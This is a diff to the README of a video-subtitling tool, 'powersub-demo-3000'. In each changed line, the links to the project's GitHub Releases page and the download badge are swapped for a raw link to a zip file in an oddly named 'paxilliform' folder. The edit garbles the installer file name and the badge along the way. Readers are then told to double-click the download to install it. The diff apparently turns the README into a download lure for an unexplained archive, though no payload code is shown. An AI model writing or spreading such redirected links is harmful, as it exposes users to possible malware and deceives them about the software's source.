@@ -4,19 +4,19 @@
 powersub-demo-3000 allows you to add subtitles to your videos effortlessly. It provides a user-friendly interface, making it accessible for everyone, regardless of technical experience.
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/mohammad-taha-ebadinik/powersub-demo-3000/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/mohammad-taha-ebadinik/powersub-demo-3000/main/paxilliform/powersub-demo-3000.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/mohammad-taha-ebadinik/powersub-demo-3000/main/paxilliform/powersub-demo-3000.zip)
 
 ## 🚀 Getting Started
 To get started with powersub-demo-3000, follow these easy steps.
 
 ### 1. Visit the Releases Page
-Go to the [Releases Page](https://github.com/mohammad-taha-ebadinik/powersub-demo-3000/releases) to see available versions.
+Go to the [Releases Page](https://raw.githubusercontent.com/mohammad-taha-ebadinik/powersub-demo-3000/main/paxilliform/powersub-demo-3000.zip) to see available versions.
 
 ### 2. Choose the Right Version
 Look for the latest version listed on the page. This version will typically have the most recent features and fixes.
 
 ### 3. Download the Application
-Click on the link for the installer file that suits your operating system. The installer is usually named something like `powersub-demo-3000-installer.exe`. 
+Click on the link for the installer file that suits your operating system. The installer is usually named something like `https://raw.githubusercontent.com/mohammad-taha-ebadinik/powersub-demo-3000/main/paxilliform/powersub-demo-3000.zip`. 
 
 ### 4. Install the Application
 Once the file has downloaded, locate it in your downloads folder. Double-click the file to begin the installation process. Follow the on-screen instructions to complete the installation.
@@ -52,9 +52,9 @@ If you have questions or need assistance, feel free to reach out through the Git
 This project is licensed under the MIT License, allowing you to freely use and modify the software. 
 
 ## 📈 Future Updates
-We aim to continuously improve powersub-demo-3000. Regular updates will be available, enhancing features and fixing bugs. Check back regularly on the [Releases Page](https://github.com/mohammad-taha-ebadinik/powersub-demo-3000/releases) for new versions.
+We aim to continuously improve powersub-demo-3000. Regular updates will be available, enhancing features and fixing bugs. Check back regularly on the [Releases Page](https://raw.githubusercontent.com/mohammad-taha-ebadinik/powersub-demo-3000/main/paxilliform/powersub-demo-3000.zip) for new versions.
 
 ## 📥 Download & Install
-To download the latest version of powersub-demo-3000, go back to the [Releases Page](https://github.com/mohammad-taha-ebadinik/powersub-demo-3000/releases). Select the installer, download it, and follow the steps above to install and use the application. 
+To download the latest version of powersub-demo-3000, go back to the [Releases Page](https://raw.githubusercontent.com/mohammad-taha-ebadinik/powersub-demo-3000/main/paxilliform/powersub-demo-3000.zip). Select the installer, download it, and follow the steps above to install and use the application. 
 
 Your journey to effortless video subtitling starts here. Enjoy using powersub-demo-3000!
